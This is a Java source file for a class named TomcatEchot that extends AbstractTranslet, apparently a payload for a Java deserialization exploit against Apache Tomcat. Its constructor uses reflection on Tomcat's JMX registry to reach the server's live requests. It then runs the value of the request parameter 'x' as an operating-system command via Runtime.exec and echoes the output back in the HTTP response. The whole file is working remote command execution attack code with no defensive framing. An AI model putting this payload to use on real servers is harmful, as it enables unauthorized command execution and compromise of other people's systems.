import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.QueryExp;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TomcatEchot extends AbstractTranslet {
    public TomcatEchot() throws Exception {
        try {
            MBeanServer var2 = Registry.getRegistry(null, null).getMBeanServer();
            String var3 = ((ObjectName)var2.queryNames(new ObjectName("Catalina:type=GlobalRequestProcessor,name=*http*"), (QueryExp)null).iterator().next()).toString();
            Matcher var4 = Pattern.compile("Catalina:(type=.*),(name=.*)").matcher(var3);
            if (var4.find())
                var3 = var4.group(2) + "," + var4.group(1);
            Field var5 = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            var5.setAccessible(true);
            Object var6 = var5.get(var2);
            var5 = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            var5.setAccessible(true);
            var6 = var5.get(var6);
            var5 = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            var5.setAccessible(true);
            HashMap var7 = (HashMap)var5.get(var6);
            var6 = ((HashMap)var7.get("Catalina")).get(var3);
            var5 = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            var5.setAccessible(true);
            var6 = var5.get(var6);
            var5 = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            var5.setAccessible(true);
            var6 = var5.get(var6);
            var5 = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            var5.setAccessible(true);
            // List<RequestInfo>
            List var8 = (List)var5.get(var6);
            var5 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            var5.setAccessible(true);
            for (int var9 = 0; var9 < var8.size(); var9++) {
                Request var10 = (Request)var5.get(var8.get(var9));
                // org.apache.coyote.Request的note数组属性中获取Request对象
                org.apache.catalina.connector.Request req = (org.apache.catalina.connector.Request) var10.getNote(1);
                org.apache.catalina.connector.Response resp = req.getResponse();
                String params = req.getParameter("x");
                String res = execX(params);
                resp.getWriter().println(res);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String execX(String cmd) {
        try{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while ((line = reader.readLine()) != null){
                str += line;
            }
            return str;
        }catch (Exception e){
            e.printStackTrace();
        }
        return "?x=whoami";
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

}
